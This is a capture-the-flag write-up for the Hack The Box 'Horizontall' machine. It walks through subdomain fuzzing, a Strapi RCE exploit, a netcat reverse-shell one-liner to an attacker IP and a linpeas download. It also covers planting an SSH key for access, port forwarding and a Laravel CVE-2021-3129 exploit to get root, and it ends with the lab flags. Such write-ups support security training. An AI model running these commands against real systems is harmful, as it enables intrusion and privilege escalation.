# Horizontall - Easy

```shell
sudo vim /etc/hosts
#10.10.11.105 horizontall.htb

nmap -T4 -p- -A -Pn -v horizontall.htb

feroxbuster -u http://horizontall.htb -w /usr/share/wordlists/dirb/common.txt -x php,html,bak,js,txt,json,docx,pdf,zip,cgi,sh,pl,aspx,sql,xml --extract-links --scan-limit 2

sudo wfuzz -c -f sub-fighter -u "http://horizontall.htb" -H "Host: FUZZ.horizontall.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
#gives false positive for 13 words, so we need to exclude it

sudo wfuzz -c -f sub-fighter -u "http://horizontall.htb" -H "Host: FUZZ.horizontall.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 13

sudo vim /etc/hosts
#add subdomain

feroxbuster -u http://api-prod.horizontall.htb -w /usr/share/wordlists/dirb/common.txt -x php,html,bak,js,txt,json,docx,pdf,zip,cgi,sh,pl,aspx,sql,xml --extract-links --scan-limit 2 --filter-status 401,404,405,500

#search for strapi exploit
python3 strapi-rce.py http://api-prod.horizontall.htb
#prints jwt
#we get shell

id
#blind rce, so we don't get output
#migrate to better shell

#setup listener in new tab
nc -nvlp 5555

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.5 5555 >/tmp/f

#we get reverse shell in new listener
python -c 'import pty;pty.spawn("/bin/bash")'

whoami
#strapi user

cd /tmp

#in attacker machine
python3 -m http.server

#get linpeas from attacker machine in shell
wget http://10.10.14.5:8000/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh

#go through config files
cat /opt/strapi/myapi/config/environments/development/database.json
#we get creds
#but it does not work for ssh login

#check listening ports
ss -ltnp

#check what's running on localhost 8000
curl http://127.0.0.1:8000

#we can log into SSH as strapi from our machine
cd /opt/strapi

mkdir .ssh

cd .ssh

#now, in attacker machine
ssh-keygen -f strapi
#no need for passphrase
#this generates strapi (private key) and strapi.pub (public key)

chmod 600 strapi

cat strapi.pub
#copy contents

#in reverse shell
#copy contents to authorized_keys
echo "ssh-rsa ..... sv@kali" > authorized_keys

chmod 600 authorized_keys

#now, in attacker machine
ssh -i strapi strapi@10.10.11.105
#we can login as strapi now

bash

#escape ssh using Enter + ~ + C keybind

#port forwarding
#in ssh prompt
-L 8000:127.0.0.1:8000

#now we can access the page on localhost:8000

#for laravel v8 exploit
python3 cve-2021-3129.py

python3 cve-2021-3129.py http://127.0.0.1:8000 Monolog/RCE1 whoami
#root

python3 cve-2021-3129.py http://127.0.0.1:8000 Monolog/RCE1 'cat /home/developer/user.txt'

python3 cve-2021-3129.py http://127.0.0.1:8000 Monolog/RCE1 'cat /root/root.txt'
```

* Open ports & services:

  * 22 - ssh - OpenSSH 7.6p1
  * 80 - http - nginx 1.14.0 (Ubuntu)

* We can begin enumerating the webpage on port 80 - ```feroxbuster``` finds /css, /img and /js, but we cannot access those directories.

* As the webpage does not contain anything significant, we can attempt to search for subdomains.

* With the help of ```wfuzz```, we can attempt to search for subdomains - we need to exclude the subdomains with 13 words due to false positives.

* ```wfuzz``` takes time, but eventually we get the subdomain 'api-prod' - we need to add this entry to our /etc/hosts file.

* An alternate way to find this subdomain is by checking the JS files for the webpage - the app script mentions <http://api-prod.horizontall.htb/reviews> endpoint.

* Now, we can start enumerating the subdomain using ```feroxbuster``` and check for hidden pages.

* We find these directories in the subdomain:

  * /admin
  * /reviews
  * /robots.txt
  * /users

* The /admin page contains a login portal for ```strapi```, while /reviews and /users are .json data.

* Now, we can Google for ```strapi``` to know more about it - seems to be a CMS.

* Googling for exploits related to this, we get multiple results - we can try the RCE exploit.

* Now, for the exploit, we can navigate to <http://api-prod.horizontall.htb/admin/init> and confirm the version - it shows strapi version 3.0.0-beta.17.4 - so this exploit would work.

* Running the exploit gives us a limited shell - it is based on blind RCE - so we can setup a new listener and run a reverse-shell one-liner to get another shell.

* Now, we are user 'strapi'; we can enumerate other users' directories for clues.

* We can use ```linpeas``` for basic enumeration.

* Using this, we are able to find some readable config files in /opt/strapi/myapi/config/environments/development/database.json - this contains the creds "developer:#J!:F9Zt2u".

* We can try logging into SSH as developer user with the found password, but it does not work.

* Now, checking for listening ports, we can see that we have ports listening on port 1337, 3306, and 8000 - 1337 is running nodejs and 3306 is used for mySQL.

* To check what's on 127.0.0.1:8000, we can use ```curl```.

* We can see that this port is running ```Laravel v8``` - Googling for exploits related to this version gives us results for CVE-2021-3129.

* Now, we need to access this page in order to exploit.

* As we can write in strapi user's directory, we can create SSH key pair on our machine, drop a key in victim machine, and access from our machine using SSH.

* After logging into the victim machine as strapi using SSH, we can escape the current SSH session using ```Enter + ~ + C```

* Now, from our SSH session, we can use SSH tunneling to get access to the webpage running on port 8000.

* We can confirm that the page on localhost:8000 is running Laravel v8.

* We can get the exploit for this from GitHub; executing it gives us the output of the command given as parameter.

* So, we can execute the commands to get user flag and root flag through the exploit script.

```markdown
1. User flag - 35889a008d63a847aa0d84860b5a79c8

2. Root flag - 0594c6be727a664d2218045e7b3e42b8
```
